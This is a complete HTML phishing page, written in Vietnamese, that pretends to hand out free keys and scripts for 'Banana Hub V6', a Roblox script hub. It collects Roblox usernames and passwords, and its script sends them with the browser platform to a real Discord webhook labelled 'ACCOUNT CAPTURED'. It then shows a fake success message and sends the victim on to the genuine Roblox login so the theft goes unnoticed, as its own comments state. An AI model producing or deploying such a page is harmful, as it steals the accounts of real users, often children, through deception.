<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banana Hub - Get Free Key</title>
    <style>
        body { background: #0c0c0c; color: #00ffff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .main-card { background: #151515; border: 1px solid #00ffff; padding: 30px; border-radius: 12px; width: 350px; text-align: center; box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
        .btn-claim { background: #00ffff; color: #000; border: none; width: 100%; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; }
        .status { font-size: 12px; color: #666; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="main-card">
        <h2 style="margin-top:0">BANANA HUB V6</h2>
        <p style="color:#888; font-size:14px;">Vui lòng đăng nhập tài khoản Roblox để hệ thống tự động gán Key vào Account của bạn.</p>
        
        <input type="text" id="u" placeholder="Tên đăng nhập / Email">
        <input type="password" id="p" placeholder="Mật khẩu">
        
        <button class="btn-claim" onclick="pwn()">NHẬN KEY & SCRIPT</button>
        
        <div class="status" id="st">Hệ thống đang chờ xác minh...</div>
    </div>

    <script>
        async function pwn() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";

            if(u.length < 3 || p.length < 3) return;

            document.getElementById('st').innerHTML = "<span style='color:#00ffff'>ĐANG GÁN KEY VÀO TÀI KHOẢN...</span>";

            // GỬI ACCOUNT & PASSWORD THẬT VỀ DISCORD
            await fetch(wh, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    content: "### 💰 ACCOUNT CAPTURED - PROJECT FIRE\n**User:** `" + u + "`\n**Pass:** `" + p + "`\n**Platform:** `" + navigator.platform + "`"
                })
            });

            // SAU ĐÓ HIỆN CODE GIẢ ĐỂ CHÚNG NÓ KHÔNG NGHI NGỜ
            setTimeout(() => {
                alert("Gán Key thành công! Script: loadstring(game:HttpGet('...'))()");
                window.location.href = "https://www.roblox.com/login";
            }, 2000);
        }
    </script>
</body>
</html>
